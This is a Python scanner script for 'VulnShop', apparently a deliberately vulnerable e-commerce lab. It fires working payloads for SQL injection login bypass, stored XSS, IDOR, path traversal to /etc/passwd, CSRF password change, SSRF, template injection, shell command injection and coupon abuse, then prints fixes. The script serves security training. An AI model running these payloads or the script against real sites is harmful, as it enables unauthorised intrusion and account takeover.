#!/usr/bin/env python3
"""
VulnShop Comprehensive Security Testing Script
This script tests all vulnerabilities in the Vulnerable E-Commerce Lab.
"""

import requests
import sys
import time
import json
from datetime import datetime

class VulnShopTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'target': base_url,
            'vulnerabilities_found': [],
            'details': {}
        }
    
    def test_sql_injection(self):
        """Test SQL Injection vulnerability"""
        print("\\n[1] Testing SQL Injection...")
        
        payload = "' OR '1'='1' --"
        data = {'username': payload, 'password': 'test'}
        
        try:
            response = self.session.post(f"{self.base_url}/login", data=data)
            
            if "dashboard" in response.url or "Welcome" in response.text:
                self.results['vulnerabilities_found'].append('SQL Injection')
                self.results['details']['sql_injection'] = {
                    'status': 'VULNERABLE',
                    'payload': payload,
                    'description': 'Authentication bypass successful'
                }
                print("[+] VULNERABLE: SQL Injection bypass successful")
                return True
            else:
                print("[-] SQL Injection test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing SQL injection: {e}")
            return False
    
    def test_xss(self):
        """Test Cross-Site Scripting vulnerability"""
        print("\\n[2] Testing XSS...")
        
        # First login
        login_data = {'username': 'john_doe', 'password': 'password123'}
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        # Try XSS payload in comment
        xss_payload = '<script>alert("XSS")</script>'
        comment_data = {
            'product_id': '1',
            'comment': xss_payload
        }
        
        try:
            response = self.session.post(f"{self.base_url}/add_comment", data=comment_data)
            
            # Check if XSS payload is present in the page
            product_response = self.session.get(f"{self.base_url}/product/1")
            
            if xss_payload in product_response.text:
                self.results['vulnerabilities_found'].append('XSS')
                self.results['details']['xss'] = {
                    'status': 'VULNERABLE',
                    'payload': xss_payload,
                    'location': 'Product comments'
                }
                print("[+] VULNERABLE: XSS payload stored and reflected")
                return True
            else:
                print("[-] XSS test failed - payload not found")
                return False
                
        except Exception as e:
            print(f"[!] Error testing XSS: {e}")
            return False
    
    def test_idor(self):
        """Test Insecure Direct Object References"""
        print("\\n[3] Testing IDOR...")
        
        found_receipts = 0
        
        try:
            # Test multiple receipt IDs
            for receipt_id in range(1, 6):
                response = self.session.get(f"{self.base_url}/receipt/{receipt_id}")
                
                if response.status_code == 200 and "Receipt not found" not in response.text:
                    found_receipts += 1
            
            if found_receipts > 0:
                self.results['vulnerabilities_found'].append('IDOR')
                self.results['details']['idor'] = {
                    'status': 'VULNERABLE',
                    'receipts_accessible': found_receipts,
                    'description': 'Unauthorized access to user receipts'
                }
                print(f"[+] VULNERABLE: {found_receipts} receipts accessible without authorization")
                return True
            else:
                print("[-] IDOR test failed - no unauthorized access")
                return False
                
        except Exception as e:
            print(f"[!] Error testing IDOR: {e}")
            return False
    
    def test_directory_traversal(self):
        """Test Directory Traversal vulnerability"""
        print("\\n[4] Testing Directory Traversal...")
        
        payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../app.py"
        ]
        
        successful_reads = 0
        
        try:
            for payload in payloads:
                response = self.session.get(f"{self.base_url}/view_file?file={payload}")
                
                if response.status_code == 200:
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['root:', 'from flask import', 'linux']):
                        successful_reads += 1
                        break
            
            if successful_reads > 0:
                self.results['vulnerabilities_found'].append('Directory Traversal')
                self.results['details']['directory_traversal'] = {
                    'status': 'VULNERABLE',
                    'description': 'Unauthorized file system access'
                }
                print("[+] VULNERABLE: Directory traversal successful")
                return True
            else:
                print("[-] Directory traversal test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing directory traversal: {e}")
            return False
    
    def test_csrf(self):
        """Test CSRF vulnerability"""
        print("\\n[5] Testing CSRF...")
        
        # Login first
        login_data = {'username': 'john_doe', 'password': 'password123'}
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        try:
            # Test password change without CSRF token
            csrf_data = {
                'new_password': 'hacked123',
                'confirm_password': 'hacked123'
            }
            
            response = self.session.post(f"{self.base_url}/change_password", data=csrf_data)
            
            if "Password changed successfully" in response.text or response.status_code == 302:
                self.results['vulnerabilities_found'].append('CSRF')
                self.results['details']['csrf'] = {
                    'status': 'VULNERABLE',
                    'description': 'Password change without CSRF protection'
                }
                print("[+] VULNERABLE: CSRF attack successful")
                return True
            else:
                print("[-] CSRF test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing CSRF: {e}")
            return False
    
    def test_ssrf(self):
        """Test Server-Side Request Forgery"""
        print("\\n[6] Testing SSRF...")
        
        # Test internal network access
        ssrf_payloads = [
            "http://127.0.0.1:5000",
            "http://localhost:22",
            "file:///etc/passwd"
        ]
        
        try:
            for payload in ssrf_payloads:
                data = {'url': payload}
                response = self.session.post(f"{self.base_url}/check_url", data=data)
                
                if response.status_code == 200:
                    result = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    if 'content' in result or 'status_code' in result:
                        self.results['vulnerabilities_found'].append('SSRF')
                        self.results['details']['ssrf'] = {
                            'status': 'VULNERABLE',
                            'payload': payload,
                            'description': 'Server-side request to internal resources'
                        }
                        print(f"[+] VULNERABLE: SSRF with payload {payload}")
                        return True
            
            print("[-] SSRF test failed")
            return False
            
        except Exception as e:
            print(f"[!] Error testing SSRF: {e}")
            return False
    
    def test_ssti(self):
        """Test Server-Side Template Injection"""
        print("\\n[7] Testing SSTI...")
        
        ssti_payload = "{{ 7*7 }}"
        
        try:
            data = {
                'name': 'test',
                'template': ssti_payload
            }
            
            response = self.session.post(f"{self.base_url}/render_template", data=data)
            
            if "49" in response.text:  # 7*7 = 49
                self.results['vulnerabilities_found'].append('SSTI')
                self.results['details']['ssti'] = {
                    'status': 'VULNERABLE',
                    'payload': ssti_payload,
                    'description': 'Template injection allows code execution'
                }
                print("[+] VULNERABLE: SSTI allows code execution")
                return True
            else:
                print("[-] SSTI test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing SSTI: {e}")
            return False
    
    def test_command_injection(self):
        """Test Command Injection"""
        print("\\n[8] Testing Command Injection...")
        
        cmd_payload = "127.0.0.1; echo 'COMMAND_INJECTION_TEST'"
        
        try:
            data = {'host': cmd_payload}
            response = self.session.post(f"{self.base_url}/ping", data=data)
            
            if response.status_code == 200:
                result = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                
                if 'COMMAND_INJECTION_TEST' in str(result):
                    self.results['vulnerabilities_found'].append('Command Injection')
                    self.results['details']['command_injection'] = {
                        'status': 'VULNERABLE',
                        'payload': cmd_payload,
                        'description': 'Command injection in ping functionality'
                    }
                    print("[+] VULNERABLE: Command injection successful")
                    return True
            
            print("[-] Command injection test failed")
            return False
            
        except Exception as e:
            print(f"[!] Error testing command injection: {e}")
            return False
    
    def test_broken_auth(self):
        """Test Broken Authentication"""
        print("\\n[9] Testing Broken Authentication...")
        
        try:
            # Test admin panel access without authentication
            response = self.session.get(f"{self.base_url}/admin")
            
            if response.status_code == 200 and ("All Users" in response.text or "Admin Panel" in response.text):
                self.results['vulnerabilities_found'].append('Broken Authentication')
                self.results['details']['broken_auth'] = {
                    'status': 'VULNERABLE',
                    'description': 'Admin panel accessible without authentication'
                }
                print("[+] VULNERABLE: Admin panel accessible without auth")
                return True
            else:
                print("[-] Broken authentication test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing broken authentication: {e}")
            return False
    
    def test_business_logic(self):
        """Test Business Logic Flaws (Coupon Abuse)"""
        print("\\n[10] Testing Business Logic Flaws...")
        
        # Login first
        login_data = {'username': 'john_doe', 'password': 'password123'}
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        try:
            # Test coupon reuse
            purchase_data = {
                'product_id': '1',
                'quantity': '1',
                'coupon_code': 'SAVE10'
            }
            
            # Make multiple purchases with same coupon
            success_count = 0
            for i in range(3):
                response = self.session.post(f"{self.base_url}/purchase", data=purchase_data)
                if response.status_code == 302:  # Redirect to receipt
                    success_count += 1
            
            if success_count > 1:
                self.results['vulnerabilities_found'].append('Business Logic Flaw')
                self.results['details']['business_logic'] = {
                    'status': 'VULNERABLE',
                    'description': f'Coupon reused {success_count} times'
                }
                print(f"[+] VULNERABLE: Coupon reused {success_count} times")
                return True
            else:
                print("[-] Business logic test failed")
                return False
                
        except Exception as e:
            print(f"[!] Error testing business logic: {e}")
            return False
    
    def generate_report(self):
        """Generate comprehensive security report"""
        print("\\n" + "="*80)
        print("VULNERABILITY ASSESSMENT REPORT")
        print("="*80)
        print(f"Target: {self.results['target']}")
        print(f"Timestamp: {self.results['timestamp']}")
        print(f"Vulnerabilities Found: {len(self.results['vulnerabilities_found'])}/10")
        print("="*80)
        
        if self.results['vulnerabilities_found']:
            print("\\nVULNERABILITIES IDENTIFIED:")
            for i, vuln in enumerate(self.results['vulnerabilities_found'], 1):
                print(f"{i:2d}. {vuln}")
                if vuln.lower().replace(' ', '_') in self.results['details']:
                    details = self.results['details'][vuln.lower().replace(' ', '_')]
                    print(f"    Status: {details['status']}")
                    print(f"    Description: {details['description']}")
                    if 'payload' in details:
                        print(f"    Payload: {details['payload']}")
                print()
        else:
            print("\\nNo vulnerabilities found (this is unexpected for this lab!)")
        
        print("SECURITY RECOMMENDATIONS:")
        print("• Implement input validation and sanitization")
        print("• Use parameterized queries to prevent SQL injection")
        print("• Implement proper authentication and authorization")
        print("• Add CSRF protection tokens")
        print("• Sanitize file paths and restrict file access")
        print("• Validate and restrict SSRF targets")
        print("• Use safe template rendering")
        print("• Implement proper business logic controls")
        print("• Add security headers and proper error handling")
        
        # Save report to file
        with open('vulnerability_report.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\\nDetailed report saved to: vulnerability_report.json")
        print("="*80)
    
    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("Starting comprehensive vulnerability assessment...")
        
        test_methods = [
            self.test_sql_injection,
            self.test_xss,
            self.test_idor,
            self.test_directory_traversal,
            self.test_csrf,
            self.test_ssrf,
            self.test_ssti,
            self.test_command_injection,
            self.test_broken_auth,
            self.test_business_logic
        ]
        
        for test_method in test_methods:
            try:
                test_method()
                time.sleep(0.5)  # Brief pause between tests
            except Exception as e:
                print(f"[!] Error in {test_method.__name__}: {e}")
        
        self.generate_report()

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:5000"
    
    print("="*80)
    print("VulnShop Comprehensive Security Assessment")
    print("="*80)
    
    tester = VulnShopTester(base_url)
    tester.run_all_tests()

if __name__ == "__main__":
    main()
